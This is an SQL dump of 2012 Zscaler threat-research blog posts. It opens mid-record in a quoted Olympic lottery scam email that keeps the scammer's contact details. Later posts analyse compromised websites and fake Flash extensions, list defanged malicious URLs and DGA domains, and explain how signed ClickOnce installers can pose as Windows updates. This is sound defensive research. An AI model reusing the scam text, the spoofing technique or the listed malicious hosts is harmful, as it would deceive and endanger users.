robertnull2010@null.net    Cell: Tel: + 44-7031741865    Fax: +447014237785   to enable him clear your file for immediate payment. Visit:    http://www.london2012.com    for more details.    You can also confirm your winning by directly calling/contacting our head office here in London on the bellow Details:         Signed By Dr. V. Beavis                                 Copyright © 1996-2012                         [Award Board Director]                                       The U.K National Lottery Inc.    Head Office U.K                             All rights reserved. Terms of Service - Guideline    E MAIL :  board.directors@london.com                                               100860 8556 2548 9576UK         Sample-2       These scams have become so common that the official Olympic website is actually maintaining a list of those which have been identified in order to warn the general public. Here is a list of the email spam/scam variations related to London Olympics 2012:  • 2012 Games Entertainments Co-ordinator  • 2012 Olympic Draws  • 2012 Olympic Promo  • 2012 Olympic Promotion Board United Kingdom – South Africa  • 2012 Olympics, A Lottery For The Future  • 2012 Summer Olympic Lottery  • 2012 Summer Olympic/Paralympic Games  • Australian Lottery (in affiliation with the London 2012 Olympics Committee)  • AUTHORISATION NOTE: P&G WORLDWIDE PARTNER / London 2012 Olympic Games  • BBC Olympic Prize  • Big Big London 2012 Olympic Lottery  • BT & London 2012 Olympics Promotions Team  • CocaCola Company and London 2012 Official Award Notification  • Coca Cola London 2012 Olympic Games Promotions  • Deloitte/London 2012 Olympic Games Promotional Draw  • Ford Olympic 2012 Promo  • Future 2012 Olympics – Congratulations!  Grosvenor/London 2012 Olympic Games Promotional Draw  • London 2012 Draw Results  • London 2012 Employment  • London 2012/ FIFA International Online Lottery  • London 2012 grant award  • London 2012/Microsoft 2011  • London 2012 press release  • London 2012 Olympic Games Raffle Award  • London 2012 Olympics/Microsoft Sweepstake  • LONDON 2012: Ticket Number: LND0026  • Olympic 2012 Awareness Lotto  • Olympic Torch  • P & G Olympic Promotion       It is advisable that if a message contains any of the above mentioned text, such messages should be dropped. Today, many antivirus solutions and email gateways provide aggressive spam filters but messages can always slip through, so individuals should be wary of any message requesting personal information, regardless of the source.', 'Uncategorised', 'https://www.zscaler.com/blogs/research/london-olympics-2012-prime-time-spammers');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (290, '\"Click To Play\" Arrives In Firefox', 'Julien Sobrier', 'July 20, 2012', 'Popular browser plugins like Flash and Adobe Reader are part of the typical web browser, with an installation base of 90+% on corporate computers (see the State of the Web report). However, they can also represent big security holes. The Blackhole exploit kit, for example, has long contained code to exploit vulnerabilities in Flash, Java and Adobe Reader. While few people may actually need a Java plugin, Flash is still required on many websites and a PDF reader in the browser is quite convenient.Click to PlayBrowser vendors have been looking for ways to secure browser plugins. One way to achieve this involves sandboxing the plugins, i.e. running plugins in a more restricted environment than the browser, with fewer rights. Unfortunately, many exploits have demonstrated that it is all too often possible to break out of the sandbox.Another idea involves disabling plugins by default and enabling them only when they are actually required by the user. \"Click to Play\" means that users must take action to enable a plugin by clicking on the area of the page that is handled by a plugin, like a Flash animation.The vast majority of exploits, including Blackhole, use invisible elements to run the malicious code: an invisible applet, invisible Flash animation, etc. Since Click to Play requires the user to actually notice elements on he page that require a plugin in order to activate it, these exploits would not run.Click to Play in Firefox - 2 clicks are required to enable the 2 Flash animationsSome inconveniencesClick to Play seems like a great security improvement. Unfortunately, there are legitimate cases when a plugin might be required to run without having to display anything. For example, Flash is commonly used to copy text to the clipboard (a shortened URL, for example).There are also JavaScript frameworks that use invisible Flash or Java applets to get access to the webcam or microphone (this is not possible through JavaScript only).There also UX challenges when asking users to click YouTube videos over and over, for example, or to ensure that users understand why they may not want to enable all plugins by default, etc.Today, only two major web browsers support Click to Play - Chrome and Firefox, but this feature is disabled by default in both browsers.ChromeClick to Play was introduced as an option in Google Chrome in March 2011 with Chrome 10. Because it is disabled by default and Chrome rarely requires users to navigate through the settings to enable it, most users are likely not aware of this security feature.In the latest versions of Chrome, Click to Play is well hidden! To enable it one must go to the Wrench Icon - Settings - Show advanced settings - Content settings...then scroll down to Plug-ins and select \"Click to Play\". That\'s five clicks to access the option. This is definitely restricted to power users! If you do not know what \"Click to Play\" means, you are out of luck because there is no mouse-over or popup to show more information.Click to Play option in Chrome 20While the screenshot of Chrome 10 showed placeholders explaining that users had to click to enable the plugin, the current placeholder are quite obscure, with no information about what they are.Click to Play placeholders - What should I do?It looks like the Click to Play feature is pretty much dead in Chrome, restricted only to power users. Not much has happened since it was released over a year ago.Firefox 14Finally, a year after Chrome, Click to Play is making it first appearance in Firefox 14. Like Chrome, it is disabled by default, and restricted to power users. There is no UI option to enable the feature. You have to go to about:config, search for click_to_play, and change the option to true.Enable Click to Play in Firefox 14Firefox\'s placeholders are better than Chrome\'s, as they clearly state \"Click here to activate plugin\". I wish however that they would indicate which plugin is going to be activated (Flash versus Java, for example).Click to Play placeholders in FirefoxI\'m afraid that the current implementation does not play well with Flash embedded in an IFRAME. On  a website that embeds a YouTube video, I get a black box, with no option to enable Flash to see the video.To Mozilla\'s credit, this is just the first iteration of Click to Play. Full support for Click to Play is scheduled for Firefox 16. Looking at their website, they seem to have a good plan to tackle the UX issues.I hope Mozilla and Google are working on making Click to Play the default setting. This would result in a big improvement in securing users online. Right now, only a few users are aware of it and even fewer benefit from the added security.', 'Uncategorised', 'https://www.zscaler.com/blogs/research/click-play-arrives-firefox');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (291, 'Visualize The Top Blacklisted Sites', 'Julien Sobrier', 'July 11, 2012', 'In the past month, I\'ve been looking at the websites blacklisted websites by Google Safe Browsing from the Alexa top 1,000,000 sites. There are between 300 and 500 of these sites blocked everyday, mostly legitimate websites that have been compromised.    I was interested in the geographical distribution of these sites. Here are the number of blocked (malicious and hijacked) sites per country (based on the website IP address), in absolute numbers. Note that to make the map useful, I decreased the number of blocked sites hosted in the US from 146 to 42 on the map because it was over 4 times that of the #2 (China).         	  		  			  		  		  			Country hosting popular websites blacklisted by Google Safe Browsing  		  	      As shown before, the US is hosting the biggest number of blacklisted sites (146), followed by China (45), followed by Germany (32) and Russia (26).    It is not surprising to see the US be #1 since they host more popular sites in general. Germany is also a popular hosting country, with lower prices than its neighbors. So I decided to show the map of blacklisted sites in relative numbers: number of blacklisted sites / number of sites hosted:         	  		  			  		  		  			Country hosting popular websites blacklisted by Google Safe Browsing in relative numbers  		  	      The distribution is pretty even amongst countries with a big Internet user population. The reason why a few small countries (Sri Lanka, Venezuela, Georgia, etc.) stand out is that they host very few sites (small sample size), so having just one or two sites blacklisted increase their percentage a lot.    Most of these blocked websites are legitimate sites hijacked as part of massive attacks spanning thousand of websites. Attackers constantly scan websites for known vulnerabilities, and they can be highly successful by finding vulnerabilities on popular websites. Blocked Chinese sites host malicious content that is very different from what I\'ve seen in other countries (see examples in the last paragraph of this post).    Do not think your personal website is safe because is has too little web traffic to attract attackers. Scans and attacks are done automatically, targets are compromised with very little resources. No website is too small to be left uncompromised.', 'Analysis', 'https://www.zscaler.com/blogs/research/visualize-top-blacklisted-sites');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (292, 'Mass Compromise Includes ComputerWorld MX', 'ThreatLabz', 'July 02, 2012', 'We were alerted to this from a customer reporting that Zscaler was blocking pages on www.computerworldmexico.mx                  And as evidence of this, was our Zulu report - which when we looked at it showed that the page itself did not have any malicious content / reason        But the site\'s own internal JS files were being flagged as malicious, e.g., tabber.js as a result of Zscaler\'s threat fingerprinting.                  Looking at the JS files, there was the addition of obfuscated JS at the end of the flagged files:        The JS makes use of the DOM to avoid automated deobfuscation, e.g., JSUnpack failed for me.  Deobfuscating, shows a number of things            	For one, the author of the malware used Windows (you can see the carriage-return newlines as ctrl-v ctrl-M in my vi editor)  	The malicious JS utilizes the setTimeout function, so that the malicious injection only occurs after being on the page for 500 miiliseconds - which can help evade rapid, automated analysis of pages  	The malicious JS injects an IFrame using a domain generation algorithm (DGA) based on time (changes about every 40,000 milliseconds or so)      Looping through the DGA, these are some of the domains:             ppsvcvrcgkllplyn.ru    ruhctasjmpqbyvhm.ru    bdvkpbuldslsapeb.ru    eilqnjkoytyjuchn.ru    npxsiiwpxqqiihmo.ru    qtmyeslmsoxkjbku.ru    adbjjkquyyhyqknf.ru    ciqmhuwgvfsxdtrw.ru    mocrafrewsdjztbj.ru    otruvbidvikzhlop.ru    yafzvancybuwmnno.ru    yafzvancybuwmnno.ru    bhujzorkulhkpwob.ru    lohnrnnpvvtxedfl.ru    ntvrnrdpyoadopbo.ru    wakvnkyzkyietkdr.ru    zfyafrjmmajqfvbh.ru    jnlkttkruqsdjqlx.ru    lsbppxhgckolsnap.ru    vznrahwzgntmfcqk.ru    xeeypppxswpquvrf.ru    inqgvoeohpcsfxmn.ru    ksgmckchdppqeicu.ru    uyrorwlibbjeasoq.ru    uyrorwlibbjeasoq.ru    wejungvnykczyjam.ru           Many of the pages are already blocked by Google SafeBrowsing:             Looks like this is all tied to an on-going campaign from mid/late June (e.g., Pastebin paste with some of the domains on June 21) and an earlier blogpost suggesting that these compromises came from the Plesk File Manager.', 'Compromise', 'https://www.zscaler.com/blogs/research/mass-compromise-includes-computerworld-mx');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (293, 'Cleartrip.com Infected With Blackhole Exploit Kit.', 'ThreatLabz', 'June 26, 2012', 'Cleartrip is used for booking flights, hotels and IRCTC Indian Railways tickets  in India. It is a leading online booking portal. Recently, I was searching flight information on www.cleartrip.comand my desktop antivirus delivered the following  alert:             Infection alert of AVG antivirus.              AVG had detected a Blackhole exploiton the following page:    hxxp://www.cleartrip.com/eadserver/delivery/afr.php?zoneid=43&target=_blank&cb=0.027297518110020458    Let’s take a look at a wireshark capture taken while visiting the page.             Packet capture snapshot of cleartrip.com                The page content of \"hxxp://www.cleartrip.com/eadserver/delivery/afr.php?zoneid=43&target=_blank&cb=0.027297518110020458\" was broken, but after a bit of searching on the site, I was able to ultimately find the same malicious code with intact de-obfuscation logic.    The URL identified this time was:  hxxp://www.cleartrip.com/eadserver/delivery/afr.php?zoneid=43&target=_blank&cb=0.46843633663340656.    For further analysis, we’ll take a look at page content. A snippet of the code is shown below:                        Code source of blocked page         Much of the content is obfuscated, so we’ll need to first de-obfuscate it in order to analyze it further.    Let’s look the obfuscated code delivered this time:                      Obfuscated code souce.              De-obfuscation of the aforementioned code reveals JavaScript which was creates a 1x1 pixel iFrame pointing to  “hxxp://trafficgoodster.info/banners.cgi?advert_id=1&banner_id=1&chid=341aa8fca26bcff7830499c1c5f8e359”    The de-obfuscated code is shown below.             URL in iFrame tag              Fortunately, Google has blacklistedthat particular URL.    Let’s take look at source of the page:             Source page view.         This URL displays a .gif file, but if you look carefully, you will see that an iFrame is also delivered. It is this URL (highlighted above), which points to the Blackhole Exploit Kit.    The .info domain used in the iframe is registered for one year and was registered only recently. Naturally, newly registered domains tend to have higher risk as they attackers often register new names for a single attack. Let’s do a whois query on the domain:    Domain Name: TRAFFICGOODSTER.INFO  Created On: 14-Jun-2012 07:52:31 UTC  Last Updated On: 14-Jun-2012 07:52:31 UTC  Expiration Date: 14-Jun-2013 07:52:31 UTC    Spammers also prefer .info domains as they as less expensive to register than .com or .net domain names.    A de-obfuscated version of the contents is shown below:                  A De-obfuscated contents.         Zscaler has informed cleartrip.com on this infection.         I thank to my colleague Pradeep Kulkarni for helping to analyze this infection.', 'Uncategorised', 'https://www.zscaler.com/blogs/research/cleartripcom-infected-blackhole-exploit-kit');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (294, 'Fake Flash Update With A Twist', 'Julien Sobrier', 'June 22, 2012', 'We\'ve seen Fake Flash updates for several years. A webpage claims that the user is running an outdated of version of Flash and they require an upgrade of the plugin to watch a video. The fake Flash update is actually a malicious executable.    This type of attack is still going on. Today, I was investigating such a malicious page. The page claims to be from xhamster.com, a free porn site. The fake video player shows a warning: \"You need the latest version of Adobe Flash Player to play this video.\"       	  		  			  		  		  			Fake porn video  		  	    However, instead of downloading a malicious executable, the user is actually asked to download a fake Flash extension. There are different variants for different browsers: .XPI for Firefox, .CRX for Google Chrome, and .EXE (BHO + installer) for Internet Explorer.       	  		  			  		  		  			Malicious extension for Firefox  		  	           	  		  			  		  		  			Extension installation on Firefox  		  	        	  		  			  		  		  			Fake extension installed  		  	      Browser extensions are open doors to infect users. Antivirus vendors do a very poor job at decting fake extensions, mostly because they are just plain text files (HTML, JavaScript), and cannot therefore contain binary malware. The VirusTotal reports for this particular attack illustrate the challenge:    	executable (Internet Explorer): detection by 21/42 AV  	XPI (Firefox): 0 detected!  	CRX (Chrome): 0 detected!      Browser extensions    Browser extensions have a fairly simple structure. They don\'t generally contain any malicious code directly, rather, when the browser starts, the add-on fetches the malicious JavaScript code from an external server and executes it.       	  		  			  		  		  			Fake extension code after deobfuscation  		  	      The current files being pulled are not very dangerous, but that could change in the future. An invisible IFRAME is inserted in each new page loaded. The IFRAME contains advertising from resultsz.com, and contains a username in the URL. This tells me that the adware author gets money for the traffic sent to this site, even if the infected user cannot actually see what is being loaded.       	  		  			  		  		  			Remote file content after deobfuscation  			   		  	      The author could change the remote file at any moment to do much more harm, like stealing cookies to obtain access to the user accounts on any site, stealing username/credentials being entered or previously saved, etc.', 'Advertising;Analysis;AntiVirus;Malware', 'https://www.zscaler.com/blogs/research/fake-flash-update-twist');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (295, 'Stolen Code Signing Certificates Are Your Worst Nightmare', 'Julien Sobrier', 'June 06, 2012', 'Flamer used spoofed code signing certificates from Microsoft. This was done to make it appear that the malicious content was actually software delivered by Microsoft.You have likely seen the use of code signing certificates when Windows pops up a User Account Control (UAC) warning to ask for your permission to make a change to your system. If the executable is signed by a Trusted code signing certificate, the UAC will display a \"Trusted Publisher\" notice, otherwise it will display an \"Unknown Publisher\" notice.Trusted executableExecutable not signedHowever, you can actually do much more with a stolen code signing certificate. Using the Microsoft ClickOnce technology, it is possible to download, run and install any executable on the user\'s desktop just with one click on a regular HTML link. Users do not have a way to stop the executable from being downloaded and installed once the link has been clicked.If you use a valid code signing certificate to sign a ClickOnce deployment file and the certificate is not part of the user\'s list of Trusted Publishers, you will receive the following popup:ClickOnce abused. You can choose between Install and Run.You may have noticed several elements that make this popup look more reassuring to a user than the usual download/run popup from Internet Explorer:The popup is not actually part of the browser, it is actually a separate application.It claims to be a Windows Update. If the user clicks on the link, they will be sent to http://support.microsoft.com/.The software seems to be hosted on a sub-domain of microsoft.com.The publisher (myself), is trusted.This looks like the real deal - Microsoft is asking me to run a Windows update, but it is actually a program I wrote myself! The \"Name\" attribute is arbitrary, it can be set to anything that looks official by the author. Also, the link, which I chose to have point to http://support.microsoft.com/, is not related to where the software is installed from.If you host the application on a sub-domain that is very long, the popup will truncate it, making it look like a sub-domain of microsoft.com if you carefully craft the URL. Since the popup width is the same on all Windows versions, regardless of the user screen resolution, such a misleading URL is easy to craft.The valid code signing certificate cost me $59, but you can get one for free. With a \"stolen\" certificate from Microsoft, the UAC would show Publisher: Microsoft.Trusted PublisherYou can bypass the UAC warning completely if the application is signed with a code signing certificate that is part of the \"Trusted Publishers\" list on the user\'s computer. In that case, there is no warning and no cancel button - the application is downloaded and run automatically. Pretty scary!The good news - the \"Trusted Publishers\" list is empty by default on Windows. The bad news - some software vendors install their own certificates along side a separate software installation. Your administrator may also push your company\'s certificate to the list in order to deploy software automatically. If one of these certificates is stolen, or if the attacker can fool users into installing a certificate of his choosing (especially if it is signed by Microsoft...), then any application can be installed on your computer without your knowledge.To verify if you have any certificates installed in your Trusted Publisher list, run \"certmgr\". In the right pane, click on \"Trusted Publishers\". if there are certificates, click on \"Certificates\" to see the list. To be safe, you should remove any that you don\'t explicitly recognize as needing to be there.My Trusted Publishers certificatesThere is no need to find vulnerabilities to install software silently on computers when ClickOnce lets you do so legitimately.', 'Microsoft', 'https://www.zscaler.com/blogs/research/stolen-code-signing-certificates-are-your-worst-nightmare');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (296, 'Zulu: The Warrior Is Even Stronger Now', 'Julien Sobrier', 'May 30, 2012', 'We have analyzed close to 100,000 URLs since we launched Zulu in January 2012. Zulu provides real-time analysis of web content to determinate whether it is safe or malicious. Our goal is and always has been to make this free service easy to use and understand.We have made significant improvements to Zulu at all levels - a more user-friendly web UI, deeper inspection, a faster back-end, improved checks, etc. Here\'s the low-down on all of the improvements that we\'ve made to date.FasterThe average time to analyze a URL is now under 5 seconds! That\'s right, it takes less than 5 seconds to lookup the domain, download the content, run more than 20 checks on the URL, DNS records and page content, followed by ranking the submission as benign, suspicious or malicious.Clear ReportingIn order to make Zulu accessible to everyone, we\'ve simplified the reports and made them more intuitive. Each check now includes a clear explanation, to detail exactly what is being analyzed. Hover your mouse over the name of each check to receive additional detail.Each rule has a clear description detailing exactly what it looks forIndividual checks have different weightings and will of course deliver different results. The significance of each check on the overall score is now indicated by one of the following graphics: a green downward arrow indicates decreased risk, a blue dash shows no impact on overall risk and shaded upward arrows ranging from green to red and growing in size, represent the degree to which overall risk has been  increased.risk: decreased, none, low, medium, highExternal elementsIn addition to scanning the URL that is sent to Zulu, we now scan up to 10 external elements that may be found in an HTML page including JavaScript, CSS, IFRAMEs, EMBED tags, links, etc. We try to choose the external elements that are the most likely to contain malicious content. External elements found on a pageThese 10 elements are scanned in parallel to the main URL, ensuring only a minimal impact on overall processing time. The final score reflects the risk associated with the main URL and each external link. You can click on each link to get the full report for the external element. This is a critical change to ensure that we\'re also catching even a single malicious link injected into an otherwise legitimate page.FeedbackA number of these improvements came from the feedback we received. Please don\'t hesitate to send an e-mail to the Zulu team, or send feedback, positive or negative, for individual Zulu submissions.\"Send us feedback\" linkZulu is free and easy to use, give it a try.', 'Analysis', 'https://www.zscaler.com/blogs/research/zulu-warrior-even-stronger-now');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (297, 'Spotting Malicious JavaScript In A Page', 'Julien Sobrier', 'May 25, 2012', 'While large blobs of obfuscated JavaScript at the top of the page are easy to spot, malicious JavaScript can often be hard to spot on hijacked sites. Some attackers go to great lengths to make their malicious code invisible to webmasters and security tools alike. In this post, I\'ll illustrate some of the places more commonly used to hide code and just how to spot them.SourceMost malicious JavaScript is pulled from a different domain other than the hijacked page. One of the first things I look for is the list of JavaScript files pulled from external domains. For example, hxxp://kelly-monaco.org/ contained a script pulled from inforaf.vot.pl that turned out to be malicious.Malicious external JavaScriptA page may contain many external JavaScript sources including, frameworks (jQuery, Prototype, etc.) a CDN, statistics (Google Analytics, counters, etc.), widgets, etc.LocationAnother good clue is the location of the script tag on the page. The attackers might be lazy and put the script tag at the very top or very bottom of the page. Always look at scripts palced before the opening HTML tag, or after the ending BODY tag.http://www.china-crb.cn/There are other places where a SCRIPT tag should not be found, for example, inside a TITLE tag.Coding StyleWhen I analyze a page, I also look for different coding styles. For example, if a webmaster uses double quotes around tag attributes, I would then look for a SCRIPT tag with single quotes, or no quotes at all. Similarly, the webmaster might use the type and language attributes. Any SCRIPT tag that uses a different coding style would raise a red flag.Well hiddenHere are some examples of very well hidden pieces of JavaScript that I\'ve encountered. In the first example, the website is using vBulletin, an open-source forum application. All vBulletin pages contain inline JavaScript to call vBulletin_init(). The attacker inserted his JavaScript between the original JavaScript command, and the function call:http://theexerciseblog.com/A malicious piece of code can also be inserted inside an existing legitimate JavaScript file on a hijacked site:Malicious code appended to AC_RunActiveContent.jsAn even more tricky spot to identify, but one more rarely used, is the insertion of malicious JavaScript inside a CSS style using expression():Malicious JavaScript in a style-sheetThese techniques are even combined with other tricks to deliver code which is directed only at specific users, such as IP blacklisting to block security scanners, cookies to prevent viewing the page twice, looking at the Referer tag to show the malicious code to users from specific sites, etc. The same page often has to be accessed in many different ways by security scanners to ensure that it is safe.', 'Analysis', 'https://www.zscaler.com/blogs/research/spotting-malicious-javascript-page');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (298, 'Follow Up On The Top Blacklisted Sites', 'Julien Sobrier', 'May 18, 2012', 'Earlier this week, I researched the top websites blacklisted by Google. I\'ve looked at more of these websites over the last three days to better understand the most common attacks. The findings are quite disappointing. First, most infected websites are not cleaned up after three days. Webmasters should see a huge drop in their traffic, since only Internet Explorer and Opera users would not receive a warning preventing them from visiting these sites, due to the fact that other browsers use the Google Safebrowsing blacklist. This also means that the owners of these very popular websites have not invested in keeping their website safe, or at least in solutions to detect the blacklisting of their pages, traffic anomalies, or the detection of malicious content.Second, the injected IFRAMES or JavaScript, redirect to the same type of malicious pages that we\'ve seen for years now, such as fake AV scareware, fake Flash updates, survey scams, etc. That means that users arestill not educated enough to recognize fake software updates and still fall for the same old tricks.These users won\'t get much help from their antivirus either. The detection rate of new malicious executables is very low, usually below 25%. Here are some of the very recognizable malicious landing pages.Fake Flash UpdatesThis is exactly the same attack we described in October 2011 (Naked Emma Watson video). A website that looks a lot like YouTube, claims that Flash must be upgraded to watch the sex video of some celebrity.Fake Youtube pageWarning about Flash upgradeOnly 9 AV vendors out of 42 detect the fake Flash upgrade executable as maliciousFake AVThis one looks different than the usual fake AV pages, as it is just an image with no animation.Fake AV pageDetected by 12 AV engines out of 42.Survey scamA common way for spammers to profit from users is to get them to do \"free\" trials in order to earn a gift (or so they claim). This type of scam is very, very common. It\'s amazing that is still works.In this example, the spammer uses a fake Youtube page to make the scam appear more legitimate.Survey scamI also found out that while Google Safe Browsing might block the infected site, it often does not block the actual malicious domain injected into the page in the form of a malicious IFRAME or JavaScript redirect. This means that other websites infected with the same piece of malware could be missed by Google Safe Browsing and still impact other users.For webmastersThere are many ways to know when your website is blacklisted. For example, you can register a free account with Google Webmaster Tools. Then look under Health > Malware for any indication of blacklisting. You can also check the Google Safe Browsing diagnostic page for your domain at http://www.google.com/safebrowsing/diagnostic?site=mysite.com. This will tell you not only if your domain is blocked, but also if a portion of your site is compromised before you actually get blacklisted. Finally, you can do some automated checks with the Google Safe Browsing Lookup API. We have released libraries to interact with the API using Perl, Python and Ruby.', 'Analysis;Compromise;AntiVirus', 'https://www.zscaler.com/blogs/research/follow-top-blacklisted-sites');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (299, 'A Look At The Top Websites Blacklisted', 'Julien Sobrier', 'May 14, 2012', 'Google Safe Browsing is the most popular security blacklist in use. It is leveraged by Firefox, Safari and Google Chrome. As such, being blacklisted by Google is a big deal - users of these three browsers are warned not to visit the sites and Google puts warnings in their search results.I\'ve run Google Safe Browsing against the top 1 million (based on number of visits) websites according to Alexa. 621 of them are blacklisted by Google Safe Browsing. I\'ve looked at the most popular to understand why they are considered malicious. Here is what I found for the most popular blacklisted sites:  Rank  Domain  Threat  Comment  6,239  subtitleseeker.com  Malicious JavaScript  Hijacked  18,784  financereports.co  Scam  Work from home scam  35,610  tryteens.com  PDF malware  Porn  41,560  iranact.co  Malicious JavaScript  Hijacked  47,016  creativebookmark.com  Fake AV  Hijacked   52,409  ffupdate.org  Adware download      52,431  vegweb.com  Malicious JavaScript  Hijacked  53,902  delgets.com  Malicious JavaScript  Hijacked  78,202  totalpad.com  Fake AV  Hijacked   81,403  kvfan.net  Malicious JavaScript  Hijacked  82,344  hgk.biz  Malicious JavaScript  Hijacked  83,858  youngthroats.com  Malicious IFRAME  Porn  125,305  metro-ads.co.in  Malicious JavaScript  Hijacked  133,455  salescript.info  Malicious JavaScript  Hijackedhttp://financereports.cocreativebookmark.comMost of the top-ranked websites that have been blacklisted are not malicious by nature, but they have been hijacked. Malicious JavaScript, similar to the code we found on a French government website, or a malicious IFRAME is generally the culprit. It is interesting to notice that Google decided to blacklist the infected site, rather than just blocking the external domain hosting the malicious content.I have also checked to see which country the blacklisted domain is hosted in. Here is the breakdown:Most of the blacklisted sites are hosted in the US. Western Europe (especially Germany, France and the Netherlands) is number two, followed by China (8%).There is a government website in this list: mdjjj.gov.cn. It contains malicious JavaScript for a third domain. The code is much more sophisticated that on the other sites on this list. The JavaScript is obfuscated, broken down in several files with a .jpeg extension. There is also a Flash exploit with a heap spray targeting Mac OS X, not unlike a Flash exploit we found on another Chinese site a few years ago. Windows users with Internet Explorer 6 and 7 users get the old \"iepeers.dll\" exploit (a different version for each browser).No site is safe from hijacking. Personal websites and top-10,000 sites are all likely to be infected at some point.', 'Analysis;Compromise;Malware', 'https://www.zscaler.com/blogs/research/look-top-websites-blacklisted');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (300, 'Search Engine Security For Internet Explorer', 'Julien Sobrier', 'April 30, 2012', 'Search Engine Security (SES), a browser extension designed to protect users against Blackhat SEO links in search engines, is now available for Internet Explorer. You can download it from our website. It is compatible with Internet Explorer 6.0 and above, on Windows XP thru Windows 7.    The features are the same as Search Engine Security for Google Chrome, released two weeks ago. The Referer and the User-Agent headers are modified when you follow a search result link on Google, Bing and Yahoo! This prevents the hijacked sites from redirecting users to a malicious page.    As with SES for Firefox and Google Chrome, you can turn the extension on and off for the three search engines.       	  		  			  		  		  			Search Engine Security enabled on Bing  		  	      You can also whitelist specific pages. The only difference with the IE version as opposed to Firefox and Chrome is that the Referrer cannot be empty. This is why the default value is \"-\".    The options are available under Tools > Search Engine Security options.       	  		  			  		  		  			Search Engine Security options  		  	      To test the features, search for \"what is my user agent\" or \"what is my referrer\" in Google, Bing or Yahoo! and follow a link. You will notice a different value when Search Engine Security is ON or OFF.       	  		  			  		  		  			Modified User-Agent  		  	    There are very few browser extensions available for Internet Explorer, especially extensions helping to keep users safe. I will continue to port the Zscaler security extensions to Internet Explorer and will bring other security tools to this platform.    You can find a full list of all our browser extensions on the ThreatLabZ portal under Tools. Search Engine Security for Internet Explorer can be downloaded here.', 'Malware', 'https://www.zscaler.com/blogs/research/search-engine-security-internet-explorer');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (301, 'Multiple Hijacking', 'Julien Sobrier', 'April 26, 2012', 'Vulnerable websites are regularly hijacked to redirect users to malicious domains. The most popular type of of malicious page are Fake AV pages. Attackers commonly increase traffic to these hijacked websites using Blackhat SEO techniques.    Blackhat SEO requires that two different pages be delivered to different audiences:         	A harmless spam page to the Googlebot and security scanners, in order to get references and be ranked well by Google, as well as evade blacklists  	A redirection to a malicious domain to attack users      Existing pages on the hijacked sites are usually unchanged and instead, new pages are created. The newly created spam pages are completely harmless, with no obfuscated JavaScript. A 302/307 HTTP redirection is done mostly via a PHP file, or using an .htaccess file.    Other groups of attackers may want to use vulnerable websites for different purposes. So it is not rare to see the same vulnerable sites being abused by different groups. Recently, there was an increase in hijacked websites sending users to Fake AV pages also being infected with malicious JavaScript. The obfuscated JavaScript code is added before the original HTML code on all pages, making it much more likely to be blacklisted by Google. Here are a few examples:         	  		  			  		  		  			Found on dailygizmonews.com  		  	                  	  		  			  		  		  			Found on malaysianaspiration.com  		  	                            	  		  			  		  		  			A mix of the 2 previous JavaScript codes  		  	        All of these examples result in the same HTML code, an IFRAME injection pointing to a malicious domain:                          	hxxp://fbyvdtydyth.myfw.us/?go=2  	hxxp://tds46.lookin.at/stds/go.php?sid=1  	hxxp://qerhkbdimoitvd5t.lowestprices.at/?go=2                            	  		  			  		  		  			Deofuscated code  		  	        Ironically, this malicious code might actually keep user safer. Since it is present on all pages, regardless of the HTTP Referrer, the entire website is flagged as malicious much more quickly by search engines.', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/multiple-hijacking');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (302, 'French Budget Minister Website Hijacked', 'Julien Sobrier', 'April 18, 2012', 'We\'ve seen an increase in hijacked websites in recent months, redirecting users to Fake AV pages, Blackhole exploit kits and other malware. While most websites hacked are personal sites, or University websites, some are more high profile.http://www.performance-publique.budget.gouv.fr/ hijackedThe website of the French Minister of Budget (www.performance-publique.budget.gouv.fr) is an example of a high profile site that was recently hijacked. Obfuscated JavaScript was added at the top of the page. It is very similar to what we have seen on other websites. The obfuscation contains some tricks to break JavaScript scanning tools, such as making reference to browser objects, exceptions, etc.Malicious JavaScript inserted on the hijacked siteThe code creates an IFRAME to hxxp://nysbrtyjdjntytdrj7yn.rr.nu/?go=2. This address is not blocked by Google Safe Browsing at this time. I was not able to retrieve the content.Deobfuscated JavaScriptThe domain rr.nu has been widely abused. It has been linked to the Mac Flashback Trojan, previous Fake AV campaigns, etc.budget.gouv.fr is not the only governmental website that has been hijacked recently. In the last three months, we have seen many hijacked government sites including:Australia: library.cgg.wa.gov.au, ofv.sa.gov.auUS: cityofhampton-ga.gov, sandy.utah.gov, governor.virginia.gov, letsread.cobbcountyga.gov, mississippi.gov, etc.Philippines: car.dost.gov.phColombia: acuavalle.gov.co, risaralda.gov.coMalaysia: ipharm.gov.myUnfortunately, no website can be fully trusted anymore.', 'Compromise;Malware;Analysis', 'https://www.zscaler.com/blogs/research/french-budget-minister-website-hijacked');
